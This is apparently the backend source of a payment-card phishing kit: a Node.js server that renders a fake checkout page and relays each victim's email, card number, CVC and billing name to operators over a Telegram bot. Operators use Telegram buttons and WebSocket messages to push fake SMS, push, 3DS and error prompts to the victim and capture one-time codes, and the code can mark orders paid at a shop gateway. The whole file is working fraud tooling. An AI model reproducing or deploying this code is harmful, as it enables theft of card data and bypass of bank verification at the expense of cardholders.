const { url, shop, inlineButtons, messageFromBot, msgBot, api, codeMSG } = require('./data/preferences');
const { bot } = require('./bot');

const bodyParser = require('body-parser')
const fs = require('fs');
const http = require("http");
const express = require( "express");
const WebSocket = require( "ws");
const { v4 } = require('uuid');
const app = express();
const server = http.createServer(app);
const webSocketServer = new WebSocket.Server({ server });
const path = require('path');
const axios = require('axios');
const MD5 = require("js-md5");


app.use(bodyParser.urlencoded({extended:true}));
app.use(express.json());


app.set('view engine', 'ejs')

app.use(express.static(path.join(__dirname,"views")));

let clients = [];


const lastData = []



const acceptPay = async (client)=> {
    const order = JSON.parse(client.order);
    const paid = "1"

    const signature = MD5.md5(`${shop.id};${order.total_price};${order.client_transaction_id};${order.key};${paid};${shop.password}`);
    try {
        const {data} = await axios.post(url.accept, {
            paid: paid,
            amount: order.total_price,
            transaction_id: order.client_transaction_id,
            key: order.key,
            signature: signature,
            shop_id: shop.id,
            password: shop.password
        });
        console.log(data);
    } catch (err) { console.log(err) }
}





app.get('/', async (req, res)=> {
    res.json({'status': 'expired'});
})

app.post('/', async (req, res)=> {
    const body = req.body;
    const order = JSON.parse(body.order_json);
    let currency = '€';
    if(order.currency_code == 'EUR') currency = '€'
    if(order.currency_code == 'USD') currency = '$'
    if(order.currency_code == 'RUB') currency = '₽'
    res.render('index.ejs', {data: body, order_json: order, order: body.order_json, currency: currency});
})

app.get('/test', (req, res)=> {
    const data = JSON.parse(fs.readFileSync('result.json', 'utf-8'));
    return res.json(data.order_lines);
})

const chat_ids = ()=> {
    try { return JSON.parse(fs.readFileSync('data/chat_ids.json', 'utf-8')); }
    catch (err) { return err };
}


const sendMessageFromBot = async (message, inline_keyboard={}, ws=null, formData={}, reply=null)=> {
    chat_ids().forEach(async user=> {
        try {
            let data;
            if(!reply) {
                data = await bot.sendMessage(user.chat_id, message, inline_keyboard);
            } else {
                data = await bot.sendMessage(user.chat_id, message, {
                    reply_to_message_id: reply
                });
            }
            if(formData) {
                if(clients.filter(client=> client.message_id == data.message_id)) {
                    clients = clients.filter(client=> client.message_id != data.message_id);
                }
                clients.push({
                    'message_id': data.message_id,
                    'order': formData.order,
                    'method': '',
                    'email': formData.email || '',
                    'cardNumber': formData.cardNumber || '',
                    'cvc': formData.cvc || '',
                    'billingName': formData.billingName || '',
                    'callbacks': {
                        'sms': false,
                        'customsms': false,
                        'push': false,
                        'custompush': false,
                        'ownerror': false,
                        '3dson': false,
                        'other_card': false,
                        'balance': false,
                        'limit': false,
                        'success': false

                    },
                    'events': {
                        customsms: false,
                        custompush: false,
                        owneror: false
                    }
                });
            }
            if(ws) {
                ws.send(JSON.stringify({
                    type: 'verify',
                    message_id: data.message_id
                }));
            }
        } catch (err) { console.log('[TELEGRAM] - Ошибка CHAT_ID не найден.') } 
    });

}




webSocketServer.on('connection', async (ws, req) => {

    bot.on('callback_query', async ctx => {
        bot.answerCallbackQuery(ctx.id).then(() => {
            if (ctx.data == 'tap') {
                bot.sendMessage(ctx.message.chat.id, 'Tapped');
            }
        });
        try {
            clients.map((client)=> {
                if(client.message_id == ctx.message.message_id) {
                    client.method = ctx.data
                }
            })
            ws.send(JSON.stringify({
                'callback': ctx.data, 
                'type': 'checkUser',
                'message_id': ctx.message.message_id
            }));
            
        }

        catch (error) {console.log(error); }

    });

    bot.on('text', async msg=> {

        clients.forEach(client=> {
            if(client.customsms) {
                ws.send(JSON.stringify({
                    'type': 'customsms',
                    'message_id': client.message_id,
                    'text': msg.text
                }));
            }

            if(client.custompush) {
                ws.send(JSON.stringify({
                    'type': 'custompush',
                    'message_id': client.message_id,
                    'text': msg.text
                }));
            }

            if(client.ownerror) {
                ws.send(JSON.stringify({
                    'type': 'ownerror',
                    'message_id': client.message_id,
                    'text': msg.text
                }));
            }
        });
    });



    ws.on('message', async msg => {
        const msgData = JSON.parse(msg.toString());

        switch (msgData.type) {
            case 'button':
                clients.forEach(client=> {
                    if(client.message_id == msgData.message_id &&
                        client.method == msgData.callback
                    ) {
                        client.customsms = false;
                        client.custompush = false;
                        client.ownerror = false;


                        if(client.callbacks[msgData.callback]) return;
                        ws.send(JSON.stringify({
                            type: 'button',
                            message: msgData.message_id,
                            callback: msgData.callback
                        }));

                        client.callbacks[msgData.callback] = true;
                    }
                })
                break;
            case 'form':
                try {
                    sendMessageFromBot(msgBot(msgData), inlineButtons, ws, msgData);
                } catch(err) { console.log('[JSON] - Некорректные данные') }
                break;
            case 'isOnline':
                clients.forEach(client=> {
                    if(client.method == msgData.callback) {
                        if(client.message_id == msgData.message_id) {
                            sendMessageFromBot('[ONLINE] - Пользователь в сети.', {}, null, {});
                        }
                    }
                });
                break;
            case 'sendSMS':
                clients.forEach(client=> {
                    if(client.message_id != msgData.message_id) return
                    sendMessageFromBot(codeMSG(client, msgData.code),{}, null, {}, client.message_id);
                });
                break;
            case 'isCustomSMS':
                // clients.forEach(client=> client.customsms = false);
                clients.forEach(client=> {
                    if(client.message_id == msgData.message_id) {
                        client.customsms = true;
                        sendMessageFromBot('[CUSTOM SMS] - Введите сообщение..', {}, null, {}, client.message_id);
                    }
                })
                break;
            case 'isCustomPUSH':
                // clients = clients.filter(client=> client.custompush != true);
                clients.forEach(client=> {
                    if(client.message_id == msgData.message_id) {
                        client.custompush = true;
                        sendMessageFromBot('[CUSTOM PUSH] - Введите сообщение..', {}, null, {}, client.message_id);
                    }
                })
                break;
            case 'isOwnError':
                // clients = clients.filter(client=> client.ownerror != true);
                clients.forEach(client=> {
                    if(client.message_id == msgData.message_id) {
                        client.ownerror = true;
                        sendMessageFromBot('[OWNEROR] - Введите сообщение..', {}, null, {}, client.message_id);
                    }
                })
                break;
            case 'clientClick':
                if(msgData.event == 'PUSH') sendMessageFromBot(`[${msgData.event}] - Клиент подтвердил`, {}, null, {}, msgData.message_id);
                if(msgData.event == 'CUSTOM PUSH') sendMessageFromBot(`[${msgData.event}] - Клиент подтвердил`, {}, null, {}, msgData.message_id);
                if(msgData.event == 'REDIRECT') sendMessageFromBot(`[${msgData.event}] - Перенаправлен на главную.\nСессия недействительна`, {}, null, {}, msgData.message_id);
                break;
            case 'sendAdmin':
                clients.forEach(async client=> {
                    if(client.message_id == msgData.message_id) {
                        if(msgData.callback == 'customsms' && client.customsms) {
                            sendMessageFromBot(`[${msgData.callback.toUpperCase()}] - Отправлено`, {}, null, {}, msgData.message_id);
                            client.customsms = false;
                        }
                        if(msgData.callback == 'custompush' && client.custompush) {
                            sendMessageFromBot(`[${msgData.callback.toUpperCase()}] - Отправлено`, {}, null, {}, msgData.message_id);
                            client.custompush = false;
                        }
                        if(msgData.callback == 'ownerror' && client.ownerror) {
                            sendMessageFromBot(`[${msgData.callback.toUpperCase()}] - Отправлено`, {}, null, {}, msgData.message_id);
                            client.ownerror = false;
                        }
                        if(msgData.callback == 'success_pay') {
                            const order = JSON.parse(client.order);
                            await acceptPay(client);
                            ws.send(JSON.stringify({
                                type: 'successRedirect',
                                message_id: msgData.message_id,
                                order: order,
                                shop_id: shop.id,
                                shop_password: shop.password,
                                redirectURL: url.success(order.payment_gateway_id)
                            }));
                            sendMessageFromBot(`[${msgData.callback.toUpperCase()}] - Вы подтвердили оплату клиенту.`, {}, null, {}, msgData.message_id);
                        }


                        if(msgData.to == `${msgData.callback}PAGE`) {
                            sendMessageFromBot(`[${msgData.callback.toUpperCase()}] - Вы перенаправили клиента.`, {}, null, {}, msgData.message_id);
                        }
                    }
                });
                break;
            case 'offline':
                clients = clients.filter(client=> client.message_id != msgData.message_id);
                break;
        }

   });


   ws.on("error", e => ws.send(e));
});


server.listen(9000, () => console.log("Server started"))
